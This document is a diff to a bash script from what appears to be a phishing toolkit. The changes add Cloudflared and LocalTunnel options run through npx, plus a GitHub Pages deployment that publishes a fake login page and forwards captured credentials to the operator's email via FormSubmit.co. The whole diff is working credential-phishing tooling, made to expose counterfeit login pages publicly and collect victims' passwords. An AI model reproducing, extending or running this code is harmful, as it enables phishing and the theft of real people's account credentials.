@@ -146,7 +146,7 @@ reset_color() {
 
 ## Kill already running process
 kill_pid() {
-	check_PID="php ssh cloudflared"
+	check_PID="php ssh cloudflared node lt npx"
 	for process in ${check_PID}; do
 		if [[ $(pidof ${process}) ]]; then # Check for Process
 			killall ${process} > /dev/null 2>&1 # Kill the Process
@@ -201,10 +201,10 @@ dependencies() {
 		fi
 	fi
 
-	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
+	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) && $(command -v npx) ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
 	else
-		pkgs=(php curl unzip)
+		pkgs=(php curl unzip nodejs npm)
 		for pkg in "${pkgs[@]}"; do
 			type -p "$pkg" &>/dev/null || {
 				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
@@ -372,10 +372,20 @@ capture_data() {
 }
 
 
+## Check for npx (Node.js)
+check_npx() {
+	command -v npx &> /dev/null && return 0
+	command -v npm &> /dev/null && return 0
+	return 1
+}
+
 ## Install Cloudflared
 install_cloudflared() {
 	if [[ -e ".server/cloudflared" ]]; then
 		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Cloudflared : ${GREEN}Found${WHITE}"
+	elif check_npx; then
+		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Cloudflared : ${GREEN}Via npx${WHITE}"
+		USE_NPX_CLOUDFLARED=1
 	else
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."
 		arch=$(uname -m)
@@ -385,6 +395,17 @@ install_cloudflared() {
 			x86_64) download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared' ;;
 			*) download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared' ;;
 		esac
+	fi
+}
+
+## Install localtunnel via npx
+install_localtunnel() {
+	if check_npx; then
+		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} LocalTunnel : ${GREEN}Available${WHITE}"
+		return 0
+	else
+		echo -e "\n${RED}[${WHITE}!${RED}]${CYAN} LocalTunnel requires Node.js (npx)"
+		return 1
 	fi
 }
 
@@ -409,20 +430,76 @@ start_cloudflared() {
 	{ sleep 1; setup_site; }
 	echo -e "\n\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
-	# Try termux-chroot first, then direct execution
-	if [[ $(command -v termux-chroot) ]]; then
-		termux-chroot ./.server/cloudflared tunnel --url "http://$HOST:$PORT" --no-autoupdate > .server/.cld.log 2>&1 &
-	else
-		./.server/cloudflared tunnel --url "http://$HOST:$PORT" --no-autoupdate > .server/.cld.log 2>&1 &
+	install_cloudflared
+
+	# Method 1: Try npx cloudflared (works on Termux/Android)
+	if [[ "$USE_NPX_CLOUDFLARED" == "1" ]]; then
+		echo -e "${CYAN}  Using npx cloudflared..."
+		npx cloudflared tunnel --url "http://$HOST:$PORT" > .server/.cld.log 2>&1 &
+		CF_PID=$!
+		echo -e "${CYAN}  Waiting for tunnel..."
+		cldflr_url=$(wait_for_tunnel ".server/.cld.log" 'https://[-a-z0-9]*\.trycloudflare\.com' 30)
+		if [[ -n "$cldflr_url" ]]; then
+			custom_url "$cldflr_url"
+			capture_data
+			return
+		fi
+		kill $CF_PID 2>/dev/null
 	fi
 
-	echo -e "${CYAN}  Waiting for tunnel..."
-	cldflr_url=$(wait_for_tunnel ".server/.cld.log" 'https://[-a-z0-9]*\.trycloudflare\.com' 20)
-	if [[ -z "$cldflr_url" ]]; then
-		echo -e "\n${MAGENTA}[${WHITE}!${RED}]${RED} Cloudflared failed. Try another option."
-		{ sleep 2; tunnel_menu; }
+	# Method 2: Try local binary with termux-chroot
+	if [[ -e ".server/cloudflared" ]]; then
+		if [[ $(command -v termux-chroot) ]]; then
+			termux-chroot ./.server/cloudflared tunnel --url "http://$HOST:$PORT" --no-autoupdate > .server/.cld.log 2>&1 &
+		else
+			./.server/cloudflared tunnel --url "http://$HOST:$PORT" --no-autoupdate > .server/.cld.log 2>&1 &
+		fi
+		echo -e "${CYAN}  Waiting for tunnel..."
+		cldflr_url=$(wait_for_tunnel ".server/.cld.log" 'https://[-a-z0-9]*\.trycloudflare\.com' 20)
+		if [[ -n "$cldflr_url" ]]; then
+			custom_url "$cldflr_url"
+			capture_data
+			return
+		fi
 	fi
-	custom_url "$cldflr_url"
+
+	echo -e "\n${MAGENTA}[${WHITE}!${RED}]${RED} Cloudflared failed. Try another option."
+	{ sleep 2; tunnel_menu; }
+}
+
+## Start LocalTunnel (npx-based, works on Termux/Android)
+start_localtunnel() {
+	rm -f .server/.lt.log > /dev/null 2>&1 &
+	cusport
+	echo -e "\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; setup_site; }
+	echo -e "\n\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Launching LocalTunnel..."
+
+	if ! check_npx; then
+		echo -e "\n${MAGENTA}[${WHITE}!${RED}]${RED} LocalTunnel requires Node.js. Install with: pkg install nodejs"
+		{ sleep 2; tunnel_menu; }
+		return
+	fi
+
+	npx localtunnel --port "$PORT" > .server/.lt.log 2>&1 &
+	LT_PID=$!
+
+	echo -e "${CYAN}  Waiting for tunnel..."
+	lt_url=$(wait_for_tunnel ".server/.lt.log" 'https://[a-z0-9.-]+\.loca\.lt' 25)
+	if [[ -z "$lt_url" ]]; then
+		lt_url=$(grep -oE 'https://[a-z0-9.-]+\.loca\.lt[/?a-zA-Z0-9=-]*' .server/.lt.log 2>/dev/null | head -1)
+	fi
+	if [[ -z "$lt_url" ]]; then
+		# Check if there is any URL in the log
+		lt_url=$(grep -oE 'https://[^ ]+' .server/.lt.log 2>/dev/null | head -1)
+	fi
+	if [[ -z "$lt_url" ]]; then
+		echo -e "\n${MAGENTA}[${WHITE}!${RED}]${RED} LocalTunnel failed. Try another option."
+		cat .server/.lt.log 2>/dev/null
+		{ sleep 2; tunnel_menu; }
+		return
+	fi
+	custom_url "$lt_url"
 	capture_data
 }
 
@@ -507,15 +584,49 @@ start_localhost() {
 }
 
 ## Tunnel selection
+## Publish to GitHub Pages (no tunnel needed)
+start_ghpages() {
+	echo -e "\n${MAGENTA}[${WHITE}-${RED}]${CYAN} GitHub Pages publishes a static version of the login page"
+	echo -e "${MAGENTA}[${WHITE}-${RED}]${CYAN} Credentials are sent to your email via FormSubmit.co\n"
+	
+	# Load or ask for email
+	if [[ -f ".zen_email" ]]; then
+		SAVED_EMAIL=$(cat .zen_email)
+		echo -e "${MAGENTA}[${WHITE}-${RED}]${CYAN} Saved email: ${GREEN}$SAVED_EMAIL"
+		read -n1 -p "${MAGENTA}[${WHITE}?${MAGENTA}]${CYAN} Use this email? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] : ${ORANGE}" EMAIL_OP
+		echo
+		if [[ ${EMAIL_OP,,} != "n" ]]; then
+			DEPLOY_EMAIL="$SAVED_EMAIL"
+		else
+			echo -e "${MAGENTA}[${WHITE}-${RED}]${CYAN} Enter your email:"
+			read -p "${WHITE} ==> ${ORANGE}" DEPLOY_EMAIL
+			echo "$DEPLOY_EMAIL" > .zen_email
+		fi
+	else
+		echo -e "${MAGENTA}[${WHITE}-${RED}]${CYAN} Enter your email (to receive captured credentials):"
+		read -p "${WHITE} ==> ${ORANGE}" DEPLOY_EMAIL
+		echo "$DEPLOY_EMAIL" > .zen_email
+	fi
+
+	echo -e "\n${MAGENTA}[${WHITE}-${RED}]${GREEN} Deploying to GitHub Pages..."
+	bash scripts/ghpublish.sh "$website" "$DEPLOY_EMAIL"
+
+	echo -e "\n${MAGENTA}[${WHITE}?${MAGENTA}]${CYAN} Press Enter to continue..."
+	read
+	main_menu
+}
+
 tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
 
 		${MAGENTA}[${WHITE}01${MAGENTA}]${CYAN} Localhost     ${RED}[${CYAN}Local only${RED}]
-		${MAGENTA}[${WHITE}02${MAGENTA}]${CYAN} Cloudflared   ${RED}[${CYAN}Fast & Free${RED}]
-		${MAGENTA}[${WHITE}03${MAGENTA}]${CYAN} Pinggy        ${RED}[${CYAN}SSH Tunnel${RED}]
-		${MAGENTA}[${WHITE}04${MAGENTA}]${CYAN} Serveo        ${RED}[${CYAN}SSH Tunnel${RED}]
-		${MAGENTA}[${WHITE}05${MAGENTA}]${CYAN} LocalRun      ${RED}[${CYAN}SSH Tunnel${RED}]
+		${MAGENTA}[${WHITE}02${MAGENTA}]${CYAN} Cloudflared   ${RED}[${CYAN}Tunnel (npx)${RED}]
+		${MAGENTA}[${WHITE}03${MAGENTA}]${CYAN} LocalTunnel   ${RED}[${CYAN}Tunnel (npx)${RED}]
+		${MAGENTA}[${WHITE}04${MAGENTA}]${CYAN} Pinggy        ${RED}[${CYAN}SSH Tunnel${RED}]
+		${MAGENTA}[${WHITE}05${MAGENTA}]${CYAN} Serveo        ${RED}[${CYAN}SSH Tunnel${RED}]
+		${MAGENTA}[${WHITE}06${MAGENTA}]${CYAN} LocalRun      ${RED}[${CYAN}SSH Tunnel${RED}]
+		${MAGENTA}[${WHITE}07${MAGENTA}]${CYAN} GitHub Pages  ${RED}[${CYAN}Static Deploy${RED}]
 
 	EOF
 
@@ -527,11 +638,15 @@ tunnel_menu() {
 		2 | 02)
 			start_cloudflared;;
 		3 | 03)
-			start_pinggy;;
+			start_localtunnel;;
 		4 | 04)
-			start_serveo;;
+			start_pinggy;;
 		5 | 05)
+			start_serveo;;
+		6 | 06)
 			start_localrun;;
+		7 | 07)
+			start_ghpages;;
 		*)
 			echo -ne "\n${MAGENTA}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; tunnel_menu; };;
